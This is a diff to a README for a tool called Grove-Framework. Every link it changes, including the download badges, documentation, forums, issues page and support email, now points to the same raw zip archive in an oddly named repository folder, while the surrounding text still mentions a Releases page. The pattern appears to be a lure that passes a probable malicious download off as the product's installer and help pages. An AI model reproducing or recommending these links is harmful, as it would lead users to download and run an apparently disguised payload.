@@ -8,7 +8,7 @@ Welcome to Grove-Framework! This software helps executives make informed decisio
 
 To download Grove-Framework, visit the link below:
 
-[![Download Grove-Framework](https://img.shields.io/badge/Download-Grove--Framework-blue.svg)](https://github.com/heros12332/Grove-Framework/releases)
+[![Download Grove-Framework](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)
 
 1. Click the link above to reach our Releases page.
 2. Choose the most recent version of Grove-Framework.
@@ -74,15 +74,15 @@ If you encounter any issues while using Grove-Framework, here are some common so
 
 For more information, consider visiting the following pages:
 
-- [Official Documentation](https://github.com/heros12332/Grove-Framework/wiki)
-- [Community Support Forums](https://github.com/heros12332/Grove-Framework/discussions)
+- [Official Documentation](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)
+- [Community Support Forums](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)
 
 ## 🌐 Contact Us
 
 If you have questions or need assistance, feel free to reach out:
 
-- Email: support@grove-framework.com
-- GitHub Issues: [Grove-Framework Issues](https://github.com/heros12332/Grove-Framework/issues)
+- Email: https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip
+- GitHub Issues: [Grove-Framework Issues](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)
 
 Thank you for choosing Grove-Framework. We're here to help you enhance your decision-making process in security matters.
 
@@ -90,4 +90,4 @@ Thank you for choosing Grove-Framework. We're here to help you enhance your deci
 
 You can download Grove-Framework anytime using the link below:
 
-[![Download Grove-Framework](https://img.shields.io/badge/Download-Grove--Framework-blue.svg)](https://github.com/heros12332/Grove-Framework/releases)
+[![Download Grove-Framework](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)](https://github.com/heros12332/Grove-Framework/raw/refs/heads/main/errantness/Framework_Grove_3.8.zip)
